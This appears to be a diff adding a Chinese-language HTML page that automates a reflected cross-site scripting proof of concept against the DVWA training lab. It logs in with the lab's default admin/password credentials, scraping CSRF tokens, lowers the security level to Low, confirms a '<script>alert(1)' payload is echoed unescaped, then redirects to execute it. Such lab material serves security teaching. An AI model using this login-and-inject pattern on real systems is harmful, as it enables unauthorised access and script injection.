@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<title>XSS PoC 引导页</title>
+<style>
+  body { font-family: Consolas, "Microsoft YaHei", monospace; background:#f6f7f9; color:#1f2430; padding:28px; }
+  h1 { font-size:18px; margin:0 0 12px; }
+  #log { background:#fff; border:1px solid #d8dde6; border-radius:8px; padding:14px 16px; line-height:1.7; font-size:14px; white-space:pre-wrap; }
+  .ok { color:#0a7d33; } .bad { color:#b3261e; } .dim { color:#6b7280; }
+</style>
+</head>
+<body>
+<h1>反射型 XSS PoC 引导</h1>
+<div id="log"></div>
+<script>
+(function () {
+  // 字符串里不能出现裸的结束标签，否则会提前截断本段脚本
+  var PAYLOAD = "<script>alert(1)<\/script>";
+  var TARGET = "/vulnerabilities/xss_r/";
+  var POC_URL = TARGET + "?name=" + encodeURIComponent(PAYLOAD);
+  var log = document.getElementById("log");
+
+  function say(text, cls) {
+    var line = document.createElement("div");
+    if (cls) { line.className = cls; }
+    line.textContent = text;
+    log.appendChild(line);
+  }
+
+  function tokenOf(html) {
+    var m = html.match(/name=['"]user_token['"]\s+value=['"]([^'"]+)['"]/i);
+    return m ? m[1] : "";
+  }
+
+  function post(url, fields) {
+    var body = new URLSearchParams();
+    Object.keys(fields).forEach(function (key) { body.set(key, fields[key]); });
+    return fetch(url, {
+      method: "POST",
+      credentials: "same-origin",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: body.toString()
+    });
+  }
+
+  async function get(path) {
+    var res = await fetch(path, { credentials: "same-origin" });
+    return await res.text();
+  }
+
+  async function loggedIn() {
+    var html = await get("/index.php");
+    return html.indexOf("logout.php") !== -1;
+  }
+
+  async function login() {
+    var page = await get("/login.php");
+    await post("/login.php", {
+      username: "admin",
+      password: "password",
+      user_token: tokenOf(page),
+      Login: "Login"
+    });
+  }
+
+  async function setLow() {
+    var page = await get("/security.php");
+    await post("/security.php", {
+      security: "low",
+      seclev_submit: "Submit",
+      user_token: tokenOf(page)
+    });
+  }
+
+  async function run() {
+    say("1) 检查会话 …");
+    if (!(await loggedIn())) {
+      say("   未登录，用靶场默认账号 admin / password 登录 …", "dim");
+      await login();
+      if (!(await loggedIn())) {
+        say("   登录失败：请先在 /login.php 手动登录后刷新本页。", "bad");
+        return;
+      }
+    }
+    say("   已登录。", "ok");
+
+    say("2) 把 DVWA 安全级别设为 Low …");
+    await setLow();
+    say("   已提交（DVWA 的 security cookie 是 HttpOnly，只能由服务端设置）。", "dim");
+
+    say("3) 校验载荷是否原样回显 …");
+    var echo = await get(POC_URL);
+    if (echo.indexOf(PAYLOAD) !== -1) {
+      say("   载荷原样进入页面，即将跳转执行。", "ok");
+      say("");
+      say("   " + PAYLOAD, "ok");
+      say("");
+      if (location.search.indexOf("dry") !== -1) {
+        say("4) dry-run 模式：不跳转，确认上面的载荷即可。", "dim");
+        return;
+      }
+      say("4) 跳转 …", "dim");
+      setTimeout(function () { location.replace(POC_URL); }, 700);
+      return;
+    }
+
+    if (echo.indexOf("&lt;script&gt;") !== -1) {
+      say("   载荷仍被转义：安全级别没有真正切到 Low。", "bad");
+      say("   请打开 /security.php 手动选择 Low 保存后刷新本页。", "bad");
+      return;
+    }
+
+    say("   页面没有回显参数，可能被重定向到 login.php，请手动登录后重试。", "bad");
+  }
+
+  run().catch(function (err) { say("出错: " + err, "bad"); });
+})();
+</script>
+</body>
+</html>
